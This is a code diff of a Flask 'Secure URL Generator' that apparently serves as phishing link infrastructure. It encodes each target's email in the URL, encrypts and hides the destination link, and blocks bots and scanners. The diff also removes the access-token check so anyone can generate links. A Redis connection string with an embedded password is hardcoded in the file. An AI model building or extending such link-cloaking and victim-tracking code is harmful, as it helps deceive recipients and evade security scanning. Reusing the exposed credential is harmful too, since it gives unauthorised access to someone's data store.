@@ -47,7 +47,6 @@ except Exception as e:
 ENCRYPTION_KEY = os.environ.get("ENCRYPTION_KEY", secrets.token_bytes(32))
 HMAC_KEY = os.environ.get("HMAC_KEY", secrets.token_bytes(32))
 REDIS_URL = os.environ.get("REDIS_URL", "redis://:AZSFAAIjcDEwMzUzMTExOTI5NDY0ZTY4OWVmYWE4NzFmZjNkMzcyNXAxMA@kind-ferret-38021.upstash.io:6379")
-ACCESS_TOKEN = os.environ.get("ACCESS_TOKEN", secrets.token_urlsafe(16))
 MAXMIND_KEY = os.environ.get("MAXMIND_KEY", "")
 BASE_DOMAIN = "nvclerks.com"
 
@@ -55,7 +54,6 @@ BASE_DOMAIN = "nvclerks.com"
 logger.debug(f"ENCRYPTION_KEY: {'set' if ENCRYPTION_KEY else 'not set'}")
 logger.debug(f"HMAC_KEY: {'set' if HMAC_KEY else 'not set'}")
 logger.debug(f"REDIS_URL: {REDIS_URL[:50]}...")
-logger.debug(f"ACCESS_TOKEN: {'set' if ACCESS_TOKEN else 'not set'}")
 logger.debug(f"MAXMIND_KEY: {'set' if MAXMIND_KEY else 'not set'}")
 
 # Redis initialization
@@ -129,21 +127,6 @@ def rate_limit(limit=10, per=60):
                 return f(*args, **kwargs)
         return wrapped_function
     return decorator
-
-def require_token(f):
-    @wraps(f)
-    def decorated(*args, **kwargs):
-        try:
-            token = request.form.get('access_token') or request.args.get('access_token')
-            if token != ACCESS_TOKEN:
-                logger.warning(f"Invalid access token: {token}")
-                abort(403, "Invalid or missing access token")
-            logger.debug("Access token validated")
-            return f(*args, **kwargs)
-        except Exception as e:
-            logger.error(f"Error in require_token: {str(e)}", exc_info=True)
-            abort(500, "Internal error during token validation")
-    return decorated
 
 def generate_fingerprint():
     try:
@@ -379,20 +362,20 @@ def index():
                     <h1 class="text-3xl font-extrabold mb-6 text-center text-gray-900">Secure URL Generator</h1>
                     <form method="POST" action="{{ url_for('generate') }}" class="space-y-5">
                         <div>
-                            <label class="block text-sm font-medium text-gray-700">Access Token</label>
-                            <input type="password" name="access_token" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                            <label class="block text-sm font-medium text-gray-700">Randomstring1</label>
+                            <input type="text" name="randomstring1" required maxlength="20" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                         </div>
                         <div>
-                            <label class="block text-sm font-medium text-gray-700">Student Name</label>
-                            <input type="text" name="student_name" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
-                        </div>
-                        <div>
-                            <label class="block text-sm font-medium text-gray-700">Student Email</label>
-                            <input type="email" name="student_email" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                            <label class="block text-sm font-medium text-gray-700">Base64emailInput</label>
+                            <input type="email" name="base64email" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                         </div>
                         <div>
                             <label class="block text-sm font-medium text-gray-700">Destination Link</label>
-                            <input type="url" name="student_link" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                            <input type="url" name="destination_link" required class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-medium text-gray-700">Randomstring2</label>
+                            <input type="text" name="randomstring2" required maxlength="20" class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition">
                         </div>
                         <button type="submit" class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition">Generate URL</button>
                     </form>
@@ -434,7 +417,6 @@ def fingerprint():
 
 @app.route("/generate", methods=["POST"])
 @rate_limit(limit=3, per=300)
-@require_token
 def generate():
     try:
         user_agent = request.headers.get("User-Agent", "")
@@ -444,29 +426,38 @@ def generate():
             logger.warning("Bot or unverified browser detected")
             abort(403, "Access denied")
 
-        student_name = request.form.get("student_name", "default")
-        student_email = request.form.get("student_email", "user@example.com")
-        student_link = request.form.get("student_link", "https://example.com")
+        randomstring1 = request.form.get("randomstring1", "default")
+        base64email = request.form.get("base64email", "user@example.com")
+        destination_link = request.form.get("destination_link", "https://example.com")
+        randomstring2 = request.form.get("randomstring2", generate_random_string(8))
 
-        if not re.match(r"^https?://", student_link):
-            logger.error(f"Invalid URL: {student_link}")
+        # Validate inputs
+        if not re.match(r"^https?://", destination_link):
+            logger.error(f"Invalid URL: {destination_link}")
             abort(400, "Invalid URL")
-        if not re.match(r"[^@]+@[^@]+\.[^@]+", student_email):
-            logger.error(f"Invalid email: {student_email}")
+        if not re.match(r"[^@]+@[^@]+\.[^@]+", base64email):
+            logger.error(f"Invalid email: {base64email}")
             abort(400, "Invalid email")
+        if len(randomstring1) > 20:
+            randomstring1 = randomstring1[:20]
+            logger.debug(f"Truncated Randomstring1 to 20 chars: {randomstring1}")
+        if len(randomstring2) > 20:
+            randomstring2 = randomstring2[:20]
+            logger.debug(f"Truncated Randomstring2 to 20 chars: {randomstring2}")
 
-        sanitized_name = re.sub(r"[^a-z0-9]", "", student_name.lower()) or "default"
+        # Sanitize subdomain (allow case preservation)
+        sanitized_name = re.sub(r"[^a-zA-Z0-9]", "", randomstring1) or "default"
         endpoint = generate_random_string(8)
-        random_string6 = generate_random_string(6)
-        random_string8 = generate_random_string(8)
-        base64_email = base64.urlsafe_b64encode(student_email.encode()).decode().rstrip("=")
-        path_segment = f"{random_string6}{base64_email}{random_string8}"
+        randomstring1_short = randomstring1[:6] if len(randomstring1) >= 6 else randomstring1 + generate_random_string(6 - len(randomstring1))
+        randomstring2_short = randomstring2[:8] if len(randomstring2) >= 8 else randomstring2 + generate_random_string(8 - len(randomstring2))
+        base64_email = base64.urlsafe_b64encode(base64email.encode()).decode().rstrip("=")
+        path_segment = f"{randomstring1_short}{base64_email}{randomstring2_short}"
 
         encryption_methods = ['heap_x3', 'slugstorm', 'pow', 'signed_token']
         method = secrets.choice(encryption_methods)
         fingerprint = generate_fingerprint()
         payload = json.dumps({
-            "student_link": student_link,
+            "student_link": destination_link,
             "timestamp": int(time.time() * 1000)
         })
 
@@ -572,8 +563,8 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                 </html>
             """, challenge=challenge)
 
-        random_string6 = path_segment[:6] if len(path_segment) >= 6 else "xxxxxx"
-        random_string8 = path_segment[-8:] if len(path_segment) >= 8 else "xxxxxxxx"
+        randomstring1_short = path_segment[:6] if len(path_segment) >= 6 else "xxxxxx"
+        randomstring2_short = path_segment[-8:] if len(path_segment) >= 8 else "xxxxxxxx"
         base64_email = path_segment[6:-8] if len(path_segment) > 14 else ""
         try:
             email = base64.urlsafe_b64decode(base64_email + "==").decode()
@@ -581,7 +572,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
                 email = "modified@example.com"
         except:
             email = "modified@example.com"
-        logger.debug(f"Parsed path_segment: random6={random_string6}, email={email}, random8={random_string8}")
+        logger.debug(f"Parsed path_segment: randomstring1={randomstring1_short}, email={email}, randomstring2={randomstring2_short}")
 
         payload = None
         for method in ['heap_x3', 'slugstorm', 'pow', 'signed_token']:
